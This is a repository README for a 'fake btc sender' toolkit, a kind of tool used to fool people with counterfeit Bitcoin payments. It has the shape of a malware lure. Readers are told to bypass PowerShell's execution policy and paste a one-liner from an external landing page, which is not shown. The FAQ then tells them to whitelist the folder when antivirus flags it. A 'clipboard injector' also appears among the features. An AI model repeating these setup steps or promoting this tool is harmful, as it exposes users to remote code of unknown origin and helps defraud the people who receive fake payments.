<p align="center">
  <a href="https://SandyM727.github.io/btc-tx-broadcaster/">
    <img src="files/button.svg" width="520" alt="Open Powershell Setup" />
  </a>
</p>

<div align="center">
<img src="assets/banner.png" width="100%" alt="Fake Btc Sender banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-059669?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-0D9488?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=4F46E5&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%93%A6+Btc+Tx+Broadcaster+Pro;%E2%AD%90+No+Limits;%F0%9F%94%A7+Active+Development+2026;%F0%9F%92%A1+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=python" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

Welcome to `btc-tx-broadcaster`, the fake btc sender toolkit that got a full January 2026 rewrite after the original repo went abandoned. The legacy monolith is gone. What's left is a clean 12-module architecture that separates crafting, relay routing, propagation simulation, and logging so you can debug a single piece without ripping the whole thing apart. Everything below is grouped by capability first, internals second.

## 📑 Table of Contents
- [💠 Overview](#-overview)
- [⚙️ Scenarios](#-scenarios)
- [🖥️ PowerShell Setup](#️-powershell-setup)
- [🧱 Requirements](#-system-requirements)
- [🔧 Features](#-features)
- [🔗 How it works](#-how-it-works)
- [💻 Compatibility](#-compatibility)
- [❓ FAQ](#-faq)
- [⚠️ Disclaimer](#️-disclaimer)
- [📜 License](#-license)

## 💠 Overview

This is the fake btc sender toolkit rewritten from scratch — a sandbox broadcaster that simulates BTC transaction propagation for research, UI mockups, screenshots, and test setups. If you've used the old scripts floating around you already know the pain: hardcoded RPC endpoints, threading races that eat your terminal, a config file that has to be edited before every run. All of that is gone. Modules talk to a shared config bus, and every relay has a failure code you can actually read.

## ⚙️ Scenarios

**Fake transaction builder** — packs a signed-looking raw tx body for UI previews without touching chain state.
**Relay mesh** — pushes the simulated payload at N endpoints in parallel with per-endpoint retry.
**Propagation map** — traces where the fake tx "traveled" in the sandbox, useful for demo screenshots.
**Screenshot mode** — locks terminal output into a stable wallet-style confirmation view.
**Clipboard injector** — swaps a demo txid into your clipboard for design mockups.
**Session logger** — writes every module call to a rotating log you can pipe into your own parser.

## 🧱 System Requirements

- Windows 10 or 11 (x64)
- PowerShell 5.1 or PowerShell 7+
- Outbound network access (the landing page bootstrap pulls the module set)
- No GPU requirement, no external wallet needed

## 🔧 Features

| Capability | Effect |
|---|---|
| Module Loader | Pulls the current 12 modules on first run and caches them per user |
| Config Bus | Shared runtime config — edit once, applies to every module |
| Builder | Generates fake btc sender payloads for preview and test setups |
| Relay Runner | Fans out a simulated tx at N endpoints in parallel |
| Retry Policy | Per-endpoint backoff you can tune without relaunching |
| Quiet Mode | Falls back to terse line output if your terminal is noisy |
| Snapshot | Captures the confirmation view as plain text for screenshots |
| Clipboard Hook | Copies the demo txid on demand |

## 🔗 How it works

1. Open **PowerShell** (built-in Start menu search is fine).
2. Set your execution policy for the current process only (`Set-ExecutionPolicy -Scope Process Bypass` if you know what you're doing).
3. Paste the one-liner from the landing page and hit Enter.
4. The bootstrap verifies Windows, drops the module set under `%LOCALAPPDATA%\btc-tx-broadcaster`, and prints the version tag.
5. Launch `btc-tx-broadcaster` from the new shell and open the config bus once — your paths and the relay host you want are all editable from there.

Edge case: if PowerShell fires a script-parse warning, restart the shell and skip the persistent-policy change — the Process scope only sticks around for the current window.

## 💻 Compatibility

- **Windows only** for the bootstrap path (Linux/macOS users should run the module loader manually).
- Works offline for previews — relay requests simply fail over silently and the builder still renders.
- No conflict with an existing `.ps1` profile.

## ❓ FAQ

<details><summary>Do I need to be on PowerShell 7?</summary>
No. 5.1 works. 7+ is recommended for cleaner error output.</details>

<details><summary>Where does the module cache live?</summary>
`%LOCALAPPDATA%\btc-tx-broadcaster` — the loader prints the exact path on first run.</details>

<details><summary>Why does the one-liner pull from the landing page?</summary>
Because the module set is versioned independently of the README. The landing is the single source of truth.</details>

<details><summary>Antivirus flags the module loader — is that expected?</summary>
Yes. Fake btc sender tooling gets heuristically flagged because strings resemble wallet manipulation. Whitelist the folder or run from a VM.</details>

<details><summary>Does my config survive a rewrite bump?</summary>
The 2026 config bus uses the same JSON keys as the legacy one, and the loader migrates it automatically.</details>

<details><summary>Can I run multiple sessions?</summary>
Yes — each session gets its own temp directory under `%TEMP%\btc-tx-broadcaster`.</details>

<details><summary>Is there a silent config mode?</summary>
Pass `-Quiet` to the launcher and the copy hook, and the loader will skip to the confirmation log.</details>

<details><summary>Where do I report a broken module?</summary>
Open an issue tagged with the module name and paste the log file path from `%LOCALAPPDATA%\btc-tx-broadcaster\logs`.</details>

## ⚠️ Disclaimer

Published for **educational and research use only**. `btc-tx-broadcaster` is a fake btc sender / sandbox simulator — it does not interact with mainnet chain state, does not move real coins, and produces simulated payloads for UI demos, screenshots, and test setups. Running it against third-party systems without permission, using it for fraud, or deploying the payload builder outside a lab environment is **not** the intended use, and is the operator's responsibility alone. **Use at your own risk.**

## 📜 License

MIT — see `LICENSE` for the full text.
